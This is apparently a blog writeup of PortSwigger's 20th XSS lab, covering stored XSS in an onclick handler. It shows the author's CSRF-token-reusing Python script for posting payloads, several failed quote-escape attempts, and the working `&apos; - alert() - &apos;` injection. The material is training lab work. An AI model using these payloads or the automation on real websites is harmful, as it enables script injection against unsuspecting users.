---
title: Stored XSS into onclick Event with Angle Brackets and Double Quotes HTML-Encoded
description: A PortSwigger XSS lab writeup about stored XSS in an onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped.
author: Koussay Dhifi
categories: [Vulnerabilities, WebExploitation]
tags: [WebExploitation, XSS, PortSwigger, Labs]
pin: true
math: true
mermaid: true
---

## Introduction

This is the 20th lab in PortSwigger's XSS series. It is titled [Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped).

## Investigation

From the description of the challenge, we can conclude that there is XSS in an `onclick` event and that it is stored XSS. Maybe it is in the usual comment feature in the PortSwigger labs.

We have the usual PortSwigger app, but no search bar feature exists here, as shown in the following image.

![Blog Page](../assets/xss/lab20/Pasted%20image.png)

So let's check the comment section of a specific post and try to add a comment alongside the user's website, as shown in the following image.

![Comment Form](../assets/xss/lab20/Pasted%20image%20(2).png)

When we inspect the element of the website after we submit our comment, we can see this interesting HTML.

```html
<a id="author" href="https://koussaydhifi.org" onclick="var tracker={track(){}};tracker.track('https://koussaydhifi.org');">Koussay</a>
```

So by escaping the JS string, we can call an alert.

I tried to test my scripting abilities since I had just learned `requests`, refreshed my `bs4` skills, and added `argparse` to my skill tree. I created a simple script that automates this injection for me.

```sh
$ python3 csrf_automation.py -h
usage: csrf_automation.py [-h] urlGet urlPost xssInjection cookie

CSRF automation tool to automate sending payloads

positional arguments:
  urlGet        This is the postitional argument of the url that you are trying to get
  urlPost       This is the URL that you are going to post to send CSRF token to
  xssInjection  The injection of XSS
  cookie        Add the cookie set in session you can see it in burp when intercepting
                the traffic

options:
  -h, --help    show this help message and exit


$ python3 csrf_automation.py https://0a4f00080441c1cc812ef2a6000700b1.web-security-academy.net/post?postId=1 https://0a4f00080441c1cc812ef2a6000700b1.web-security-academy.net/post/comment https://koussaydhifi.og\" OwLHHPPwSGtq7c7LIZn020Krk2eXa60U
[*] Sending Get Request ... 
[*] Extracting CSRF Token ... 
[*] Reusing CSRF Token to send POST request ...
[+] Successfully Sent Payload !
Payload result: <a href='https://koussaydhifi.og"' id="author" onclick="var tracker={track(){}};tracker.track('https://koussaydhifi.og&quot;');">Butler</a>
```

Was it a waste of time? Absolutely. I spent literally one week procrastinating to write this script, but was it worth it? Absolutely yes.

Now let's try our new tool and inject some things by hand since I am too lazy to use a GUI.

While fuzzing and trying to see what is wrong, I realized a simple pattern: whenever I try to close HTML with one quote, I find the HTML params start with a double quote, and whenever I try to close it with double quotes, I find it has a single quote, like this:

```sh
%-----------------------Double Quote ------------------------%

s$ python3 csrf_automation.py https://0a4f00080441c1cc812ef2a6000700b1.web-security-academy.net/post?postId=1 https://0a4f00080441c1cc812ef2a6000700b1.web-security-academy.net/post/comment "https://koussaydhifi.org\'onclick=\'alert()'" OwLHHPPwSGtq7c7LIZn020Krk2eXa60U
[*] Sending Get Request ... 
[*] Extracting CSRF Token ... 
[*] Reusing CSRF Token to send POST request ...
[+] Successfully Sent Payload !
Payload result: <a href="https://koussaydhifi.org\\\'onclick=\\\'alert()\'" id="author" onclick="var tracker={track(){}};tracker.track('https://koussaydhifi.org\\\'onclick=\\\'alert()\'');">Butler</a>

%-----------------------Single Quote ------------------------%

$ python3 csrf_automation.py https://0a4f00080441c1cc812ef2a6000700b1.web-security-academy.net/post?postId=1 https://0a4f00080441c1cc812ef2a6000700b1.web-security-academy.net/post/comment "https://koussaydhifi.org\"onclick=\"alert()\"" OwLHHPPwSGtq7c7LIZn020Krk2eXa60U
[*] Sending Get Request ... 
[*] Extracting CSRF Token ... 
[*] Reusing CSRF Token to send POST request ...
[+] Successfully Sent Payload !
Payload result: <a href='https://koussaydhifi.org"onclick="alert()"' id="author" onclick="var tracker={track(){}};tracker.track('https://koussaydhifi.org&quot;onclick=&quot;alert()&quot;');">Butler</a>
```

So maybe there is a simple algorithm that contains a vulnerability here, which is that it detects if the string contains one quote. If so, it starts HTML params with double quotes, and the opposite. I may be doing the "trust me bro" thing here, but this is the only thing that makes sense.

So by trying to add a single quote as camouflage, it will use double quotes, and after that I can close it with double quotes. Genius. I am just a genius; you have to admit this.

And it did not work. Basically, if I insert double quotes, they are the ones that get encoded.

After reading the writeup, I learned something new. In HTML, single quotes can be written as `&apos;`, and this string is validated by the server and passes normally. The browser interprets it as HTML and converts it to a single quote in JS within the HTML context, and then you can guess where we are going.

So when we insert the payload `https://website.com &apos; - alert() - &apos;`, it gets interpreted in the JS in the HTML context like the following:

```html
<a id="author" href="https://website.com ' - alert() - '" onclick="var tracker={track(){}};tracker.track('https://website.com ' - alert() - '');">johnSmith</a>
```

That expression runs `alert()` first, and then it tries to make a subtraction since JS is weakly typed.

![Solved Lab](../assets/xss/lab20/Pasted%20image%20(3).png)

## Conclusion

User-controlled JS within an HTML context is reckless developer behavior.
